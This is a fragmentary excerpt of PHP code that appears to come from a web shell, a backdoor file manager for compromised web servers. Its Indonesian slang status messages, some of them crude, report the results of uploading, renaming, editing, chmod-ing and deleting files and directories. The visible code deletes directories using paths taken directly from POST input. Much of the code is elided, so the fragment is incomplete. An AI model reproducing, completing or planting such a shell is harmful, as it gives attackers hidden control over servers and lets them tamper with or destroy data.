...
echo '<br><br><font color="lime">UPLOAD SUCCES CLEKKK !!!!</font><br/>';
}else{
echo '<script>alert("File Gagal Diupload Ngentd !!")</script>';
}
}
...
echo '<br><br><font color="lime">CHANGE PERMISSION SUCCESS CLEKKK !!</font><br/>';
}else{
...
echo '<br><br><font color="lime">CHANGE NAME SUCCESS CLEKKK !!</font><br/>';
}else{
echo '<script>alert("Change Name Gagal Ngab !!")</script>';
}
...
echo '<br><br><font color="lime">EDIT FILE SUCCESS CLEKKK !!</font><br/>';
}else{
echo '<script>alert("Edit File Gagal Ngab !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">DELETE DIR SUCCESS CLEKKK !!</font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal Ngab !!")</script>>';
}
}
...
echo '<br><br><font color="lime">DELETE FILE SUCCESS CLEKKK!!</font><br/>';
}else{
echo '<script>alert("Delete File Gagal Ngab !!")</script>';
}
}
}
